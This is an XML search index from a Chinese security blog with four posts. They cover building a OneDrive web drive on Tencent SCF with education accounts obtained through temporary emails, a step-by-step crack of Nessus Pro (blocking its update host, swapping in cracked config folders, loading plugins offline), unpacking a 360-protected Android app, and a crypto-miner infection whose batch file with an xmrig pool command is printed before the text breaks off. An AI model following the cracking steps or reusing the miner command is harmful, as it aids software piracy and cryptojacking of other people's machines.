<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用腾讯SCF+onedrive搭建5T个人网盘</title>
      <link href="/2019/12/02/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AFSCF-onedrive%E6%90%AD%E5%BB%BA5T%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
      <url>/2019/12/02/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AFSCF-onedrive%E6%90%AD%E5%BB%BA5T%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几日在群里看到有人使用腾讯的SCF（云函数）+onedrive来搭建属于自己的个人网盘，对此我颇有兴趣今日就来研究研究，今将研究结果奉上，如有不足之处，还请提出改正，共同进步。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202093328.png" class="lozad"></p><a id="more"></a><h1 id="0x01-需求准备"><a href="#0x01-需求准备" class="headerlink" title="0x01 需求准备"></a>0x01 需求准备</h1><ol><li>onedrive账号（推荐教育版5T）</li><li>onedrive_SCF源码</li><li>个人域名</li><li>腾讯云账号</li></ol><h1 id="0x02-申请5T空间"><a href="#0x02-申请5T空间" class="headerlink" title="0x02 申请5T空间"></a>0x02 申请5T空间</h1><p>原理就是使用临时邮箱申请5T空间，之前的那个申请网站由于被人恶意使用短信炸弹轰炸，已经不能收到短信了，所以，今天推荐另一个网站。</p><blockquote><p>ps:个人不保证不会翻车，大家可以用来做自己的备份云盘。</p></blockquote><p>申请5T空间：<a href="http://233455.xyz:3000/" target="_blank" rel="noopener">传送门</a></p><p>申请教程可参考我的另一篇文章：<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/)">onedrive+oneindex打造属于自己的个人网盘</a></p><h1 id="0x03-开启搭建之路"><a href="#0x03-开启搭建之路" class="headerlink" title="0x03 开启搭建之路"></a>0x03 开启搭建之路</h1><h2 id="3-1-下载-onedrive-SCF源码"><a href="#3-1-下载-onedrive-SCF源码" class="headerlink" title="3.1 下载 onedrive_SCF源码"></a>3.1 下载 onedrive_SCF源码</h2><blockquote><p><a href="https://github.com/Tai7sy/OneDrive_SCF" target="_blank" rel="noopener">https://github.com/Tai7sy/OneDrive_SCF</a></p></blockquote><h2 id="3-2-注册腾讯云"><a href="#3-2-注册腾讯云" class="headerlink" title="3.2 注册腾讯云"></a>3.2 注册腾讯云</h2><blockquote><p><a href="https://cloud.tencent.com/" target="_blank" rel="noopener">https://cloud.tencent.com/</a></p></blockquote><h2 id="3-3-配置云函数"><a href="#3-3-配置云函数" class="headerlink" title="3.3 配置云函数"></a>3.3 配置云函数</h2><h3 id="3-3-1-新建云函数"><a href="#3-3-1-新建云函数" class="headerlink" title="3.3.1 新建云函数"></a>3.3.1 新建云函数</h3><p>登录腾讯云函数平台后，新建一个云函数，地区选择香港或者新加坡地区。创建的云函数名称随便填写，运行的环境选择PHP7.2 ，创建方式选择模板函数；模板选择helloword模板，下一步直接完成。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202095348.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100001.png" class="lozad"></p><p>创建一个新的函数服务，地址选择<code>中国香港</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100014.png" class="lozad"></p><p>新建一个<code>helloworld</code>模板函数</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100021.png" class="lozad"></p><p>拉到最下面，点击下一步，然后点击完成</p><h3 id="3-3-2-上传onedrive-SCF文件夹"><a href="#3-3-2-上传onedrive-SCF文件夹" class="headerlink" title="3.3.2 上传onedrive_SCF文件夹"></a>3.3.2 上传onedrive_SCF文件夹</h3><p>从GitHub下载OneDrive_SCF源码，进入函数服务选择函数代码，提交代码选择本地上传文件夹，上传刚才解压的文件夹（注意：如果解压了双层文件夹需要点入第二个文件夹）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100324.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100422.png" class="lozad"></p><h3 id="3-3-3-添加触发方式"><a href="#3-3-3-添加触发方式" class="headerlink" title="3.3.3 添加触发方式"></a>3.3.3 添加触发方式</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100428.png" class="lozad"></p><p>选择<code>API网关触发器</code>，勾选<code>启用集成响应</code>，然后点击保存。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100634.png" class="lozad"></p><p>然后会生成一个访问路径。点击这个路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101707.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101712.png" class="lozad"></p><h3 id="3-3-4-新建密钥"><a href="#3-3-4-新建密钥" class="headerlink" title="3.3.4 新建密钥"></a>3.3.4 新建密钥</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101736.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101746.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101750.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101819.png" class="lozad"></p><p>然后使用微信扫描二维码，获得密钥全部的内容</p><h3 id="3-3-5-添加环境变量"><a href="#3-3-5-添加环境变量" class="headerlink" title="3.3.5 添加环境变量"></a>3.3.5 添加环境变量</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101909.png" class="lozad"></p><p>将刚刚的新建的秘钥添加到环境变量中。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101913.png" class="lozad"></p><p>添加完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101919.png" class="lozad"></p><p>其他的环境变量添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sitename=站点名称</span><br><span class="line">private_path=Onedrive根路径（绑定自定义域名使用）</span><br><span class="line">public_path=Onedrive根路径（未绑定自定义域名使用）</span><br><span class="line">passfile=.password(加密文件)</span><br><span class="line">admin=管理员密码</span><br></pre></td></tr></table></figure><h3 id="3-3-6-开始安装"><a href="#3-3-6-开始安装" class="headerlink" title="3.3.6 开始安装"></a>3.3.6 开始安装</h3><p>再次刷新刚刚的错误页面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101950.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102007.png" class="lozad"></p><p>登录OneDrive账号，这里我已经登录过了，直接选择就行了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102013.png" class="lozad"></p><p>成功登录后自动跳转到云盘</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102058.png" class="lozad"></p><h3 id="3-3-7-自定义域名设置"><a href="#3-3-7-自定义域名设置" class="headerlink" title="3.3.7 自定义域名设置"></a>3.3.7 自定义域名设置</h3><p>点击触发方式，然后点击API服务名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102115.png" class="lozad"></p><p>选择自定义域名，新建。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102120.png" class="lozad"></p><p>在域名厂商设置域名解析，我域名是在腾讯买的，所以直接到域名解析出添加一个域名解析记录，主机记录就是二级域名，记录类型是CNAME（域名指向域名），记录值填触发方式中的访问路径。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102128.png" class="lozad"></p><p>设置完域名解析后，在到自定义域名除继续设置。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102134.png" class="lozad"></p><blockquote><p>ps:没有证书的话，就选择http协议。</p></blockquote><p>在index.php中的609行左右，添加域名协议的代码</p><script>  if (location.protocol === "http:") {    location.href = location.href.replace(/http/, "https");  }</script><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102138.png" class="lozad"></p><p>再次使用域名访问，显示没有uri路径设置有问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102156.png" class="lozad"></p><p>重新修改路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102203.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102212.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102216.png" class="lozad"></p><p>再次使用域名访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202103229.png" class="lozad"></p><h1 id="0x04-采坑记录"><a href="#0x04-采坑记录" class="headerlink" title="0x04 采坑记录"></a>0x04 采坑记录</h1><h3 id="4-1-创建权限错误"><a href="#4-1-创建权限错误" class="headerlink" title="4.1 创建权限错误"></a>4.1 创建权限错误</h3><p>在创建API网管触发器的时候，出现操作未授权的错误，和教程不一样，网上也搜不到相关的信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202104550.png" class="lozad"></p><p>解决方法：其实就是用户自己没有授权，重新返回主页在点击去时会弹出授权，直接授权就好了。</p><h1 id="0x05-甩锅"><a href="#0x05-甩锅" class="headerlink" title="0x05 甩锅"></a>0x05 甩锅</h1><ol><li>教育版的5T空间可能会翻车，如果翻车，与作者无关奥。</li><li>腾讯SCF现在开始收费了，之前是免费的，所以大家可以当做一个技术来学习，当前，不在乎这点钱的话可以考虑继续使用奥，具体的收费标准请自己到官网查看。</li><li>设置了自定义域名后，可在互联网上直接发访问，所以一些私密的文件请不要上传到该网盘中，并且最好给文件夹加上密码，造成内部资料的泄露，作者不负责任奥。</li></ol><h1 id="0x06-参考连接"><a href="#0x06-参考连接" class="headerlink" title="0x06 参考连接"></a>0x06 参考连接</h1><p><a href="https://eebk.com/archives/30.html" target="_blank" rel="noopener">https://eebk.com/archives/30.html</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人网盘 </tag>
            
            <tag> SCF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nessus pro破解安装及插件离线跟新</title>
      <link href="/2019/11/27/nessus-pro%E7%A0%B4%E8%A7%A3%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8F%92%E4%BB%B6%E7%A6%BB%E7%BA%BF%E8%B7%9F%E6%96%B0/"/>
      <url>/2019/11/27/nessus-pro%E7%A0%B4%E8%A7%A3%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8F%92%E4%BB%B6%E7%A6%BB%E7%BA%BF%E8%B7%9F%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>nessus是扫描主机漏洞的扫描器中最流行的扫描器之一，有个人免费版本和专业版本。但是个人免费版本有很多功能上面的限制，所以，今天来给教大学如何安装破解成专业版的，并且离线跟新nessus的最新插件的方法</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c33229afd072e890" class="lozad"></p><a id="more"></a><h1 id="0x01-安装环境"><a href="#0x01-安装环境" class="headerlink" title="0x01 安装环境"></a>0x01 安装环境</h1><blockquote><p>操作系统：Windows 7 x64</p><p>nessus版本：Nessus 8.2.3</p></blockquote><h1 id="0x02-安装nessus"><a href="#0x02-安装nessus" class="headerlink" title="0x02 安装nessus"></a>0x02 安装nessus</h1><p>安装包地址：</p><p>下载好安装包以后双击Nessus-8.2.3-x64(20190217).msi安装路径使用默认路径。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161358.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161622.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161635.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161710.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161724.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161825.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161839.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161852.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161907.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161924.png" class="lozad"></p><p>到这里安装完成</p><h1 id="0x03-停止Nessus服务"><a href="#0x03-停止Nessus服务" class="headerlink" title="0x03 停止Nessus服务"></a>0x03 停止Nessus服务</h1><p>按win+R键输入services.msc快速进入服务列表</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162131.png" class="lozad"></p><p>找到Tenable Nessus ，右击属性停止服务</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162252.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162350.png" class="lozad"></p><h1 id="0x04-屏蔽Nessus更新地址"><a href="#0x04-屏蔽Nessus更新地址" class="headerlink" title="0x04 屏蔽Nessus更新地址"></a>0x04 屏蔽Nessus更新地址</h1><p>为避免Nessus激活信息时效，需要在host文件中屏蔽Nessus更新地址。<br>修改<code>C:\Windows\System32\drivers\etc\hosts</code>文件，添加一行内容：<br>127.0.0.1 plugins.nessus.org</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162602.png" class="lozad"></p><p>写完以后保存发现需要另存为，并且自动保存为txt文本了，但是看不到后缀名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162950.png" class="lozad"></p><p>【显示扩展名】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163115.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163234.png" class="lozad"></p><p>然后删除原先的hosts，将新生成的hosts.txt后缀名删掉（重命名）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163341.png" class="lozad"></p><h1 id="0x05-破解nessus"><a href="#0x05-破解nessus" class="headerlink" title="0x05 破解nessus"></a>0x05 破解nessus</h1><p>打开C:\ProgramData\Tenable\Nessus目录，删除已有的conf和nessus目录</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163753.png" class="lozad"></p><p>将压缩包中conf和nessus文件夹复制替换原来nessus安装目录下的文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163830.png" class="lozad"></p><p>在服务中启动Tenable Nessus服务，浏览器访问<a href="https://localhost:8834使用Nessus。" target="_blank" rel="noopener">https://localhost:8834使用Nessus。</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164017.png" class="lozad"></p><p>等待初始化完成</p><blockquote><p>账号：Nessus<br>密码：Nessus</p></blockquote><p>【破解前】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164316.png" class="lozad"></p><p>【破解后】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164158.png" class="lozad"></p><p>对比一下很容易发现，破解后的nessus解锁了很多功能，并且还解除了IP数量的限制。</p><h1 id="0x06-离线跟新"><a href="#0x06-离线跟新" class="headerlink" title="0x06 离线跟新"></a>0x06 离线跟新</h1><p>由于激活信息中硬件信息与本机不一致，无法使用在线更新，只能通过下载插件包离线更新.</p><p>刚刚安装的插件版本是：<code>Plugin Set：201904182242</code></p><p>【资源下载】</p><blockquote><p>链接: <a href="https://pan.baidu.com/s/1tPRWymDRwdB0V22ATC0PdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1tPRWymDRwdB0V22ATC0PdQ</a> 提取码: v4wk</p></blockquote><p>将下载好的插件包文件all-2.0.tar.gz拷贝到<code>C:\Program Files\Tenable\Nessus</code>目录下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165135.png" class="lozad"></p><p>打开CMD跳转到该目录，执行以下命令更新：</p><blockquote><p>nessuscli.exe update all-2.0.tar.gz</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165301.png" class="lozad"></p><p>耐心等待一会，更新完成后，提示：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165513.png" class="lozad"></p><p>说明跟新插件成功了。</p><p>【跟新插件前】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165744.png" class="lozad"></p><p>【跟新插件后】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165837.png" class="lozad"></p><p>对比一下可以发现，插件的数量增多了，plugin文件夹的大小也变大了。</p><h1 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h1><p>本次教程讲解了Nessus的安装与破解，下次教程会讲解如何使用nessus进行扫描测试。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战脱壳奇虎360</title>
      <link href="/2019/11/26/%E5%AE%9E%E6%88%98%E8%84%B1%E5%A3%B3%E5%A5%87%E8%99%8E360/"/>
      <url>/2019/11/26/%E5%AE%9E%E6%88%98%E8%84%B1%E5%A3%B3%E5%A5%87%E8%99%8E360/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，有时候需要对APP进行逆向分析，但是如果APP被加壳以后，就看不到里面的源代码了。所以我们需要对加壳的APP先进行脱壳处理。常用的加壳有：奇虎360，爱加密，梆梆安全等。今天给大家介绍的就是使用反射大师3.0脱360的壳。</p><a id="more"></a><h1 id="0x01-工具准备"><a href="#0x01-工具准备" class="headerlink" title="0x01 工具准备"></a>0x01 工具准备</h1><p>1.逍遥模拟器（需root） ：<a href="https://www.xyaz.cn/" target="_blank" rel="noopener">传送门</a></p><p>2.MT管理器 ：应用市场直接安装</p><p>3.xposed框架： </p><blockquote><p>链接: <a href="https://pan.baidu.com/s/1kWQDgKR" target="_blank" rel="noopener">百度网盘</a> 密码: 5ixp      版本3.15</p></blockquote><p>4.反射大师3.0 ：<a href="http://www.ddooo.com/softdown/158157.htm" target="_blank" rel="noopener">传送门</a></p><p>5.手机网管（脱壳示例应用）</p><h1 id="0x02-环境安装"><a href="#0x02-环境安装" class="headerlink" title="0x02 环境安装"></a>0x02 环境安装</h1><h2 id="2-1-安装逍遥模拟器"><a href="#2-1-安装逍遥模拟器" class="headerlink" title="2.1.安装逍遥模拟器"></a>2.1.安装逍遥模拟器</h2><p>傻瓜式安装，这里不再描述，默认开启root</p><h2 id="2-2-MT管理器"><a href="#2-2-MT管理器" class="headerlink" title="2.2.MT管理器"></a>2.2.MT管理器</h2><p>一个文件夹管理器，需要root</p><h2 id="3-3-xposed框架激活安装"><a href="#3-3-xposed框架激活安装" class="headerlink" title="3.3.xposed框架激活安装"></a>3.3.xposed框架激活安装</h2><p>将下载好的安装包直接拖进逍遥模拟器即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093549.png" class="lozad"></p><p>【激活框架】</p><p><strong>未激活状态</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093824.png" class="lozad"></p><p>下载安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093851.png" class="lozad"></p><p>这个下载的过程需要等待一会，具体的速度和网速有关（小疑惑：用公司的wifi下载贼慢，自己的手机热点很快）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094038.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094226.png" class="lozad"></p><p>安装完成后重新启动模拟器</p><p><strong>激活成功截图</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093747.png" class="lozad"></p><p>4.反射大师3.0</p><p>将反射大师3.0的安装包直接拖进模拟器中安装即可。</p><p>安装成功了，需要到xposed框架中去激活反射大师。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094600.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094614.png" class="lozad"></p><p>将反射大师勾选上</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094628.png" class="lozad"></p><p>OK，到这里所有需要的工具和环境都准备完毕。</p><h1 id="0x03-开始逆向脱壳"><a href="#0x03-开始逆向脱壳" class="headerlink" title="0x03 开始逆向脱壳"></a>0x03 开始逆向脱壳</h1><h2 id="3-1-提取安装包"><a href="#3-1-提取安装包" class="headerlink" title="3.1 提取安装包"></a>3.1 提取安装包</h2><p>打开MT管理器，按照下面步骤提取安装包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126100017.gif" class="lozad"></p><h2 id="3-2-查看加密方式"><a href="#3-2-查看加密方式" class="headerlink" title="3.2 查看加密方式"></a>3.2 查看加密方式</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126140731.gif" class="lozad"></p><p>可以看到加壳方式为奇虎360</p><h2 id="3-3-开始脱壳"><a href="#3-3-开始脱壳" class="headerlink" title="3.3 开始脱壳"></a>3.3 开始脱壳</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141257.gif" class="lozad"></p><h3 id="3-3-1-当前activity"><a href="#3-3-1-当前activity" class="headerlink" title="3.3.1 当前activity"></a>3.3.1 当前activity</h3><p>可以看到再次打开看到一个红色的五角星在屏幕中间。点击五角星在点击<code>当前ACTIVITY</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141619.png" class="lozad"></p><h3 id="3-3-2-getClass"><a href="#3-3-2-getClass" class="headerlink" title="3.3.2 getClass"></a>3.3.2 getClass</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141743.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141855.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141937.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141951.png" class="lozad"></p><h3 id="3-3-3-getDex"><a href="#3-3-3-getDex" class="headerlink" title="3.3.3 getDex"></a>3.3.3 getDex</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142014.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142125.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142154.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142211.png" class="lozad"></p><h3 id="3-3-4-getBytes"><a href="#3-3-4-getBytes" class="headerlink" title="3.3.4 getBytes"></a>3.3.4 getBytes</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142233.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142349.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142404.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142413.png" class="lozad"></p><h3 id="3-3-5-导出dex文件"><a href="#3-3-5-导出dex文件" class="headerlink" title="3.3.5 导出dex文件"></a>3.3.5 导出dex文件</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142428.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142505.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142531.png" class="lozad"></p><h2 id="3-4-查看脱壳效果"><a href="#3-4-查看脱壳效果" class="headerlink" title="3.4 查看脱壳效果"></a>3.4 查看脱壳效果</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142705.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142742.png" class="lozad"></p><h3 id="3-4-1-脱壳前"><a href="#3-4-1-脱壳前" class="headerlink" title="3.4.1 脱壳前"></a>3.4.1 脱壳前</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126143700.png" class="lozad"></p><h3 id="3-4-2-脱壳后"><a href="#3-4-2-脱壳后" class="headerlink" title="3.4.2 脱壳后"></a>3.4.2 脱壳后</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142759.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142829.png" class="lozad"></p><blockquote><p>这个脱壳的方式还有不足的，因为这个软件没有使用账号登录，所以登录之后的acticity还是混淆的状态。</p></blockquote><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>学无止尽，不断学习，不断进步，共勉！</p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-040f14dd58df251a392f0151d7f4762d.jpg" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次主机中挖矿病毒</title>
      <link href="/2019/11/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
      <url>/2019/11/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>近日因为在一些文章中看到了远控这块，所以就在网上找了一些资源小研究了一下，然而今天研究完关机，回去重启以后出现下面这个弹框。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121234718.png" class="lozad"></p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a10bd43fe05fe1f6e4cc9aa9c508362a.jpg" class="lozad"></p><a id="more"></a><p>前方低能，各位大佬勿喷~</p><h1 id="0x01-溯源分析"><a href="#0x01-溯源分析" class="headerlink" title="0x01 溯源分析"></a>0x01 溯源分析</h1><p>对于那个黑框框中的exe文件，我先百度了一波。发现是一个挖矿病毒</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235715.png" class="lozad"></p><p>知道这是病毒了，但是不知道在哪啊，溯源？咋溯源？咱也不知道啊，咋整？还是360香~~</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235306.png" class="lozad"></p><p>根据360的扫描结果定位到system32这个目录。先不一键处理，先到这个目录看看情况吧。在C盘中看到如下一些文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191121235558.png" class="lozad"></p><p>打开这个文件，代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">xmrig.exe -o xmr.crypto-pool.fr:3333 -u 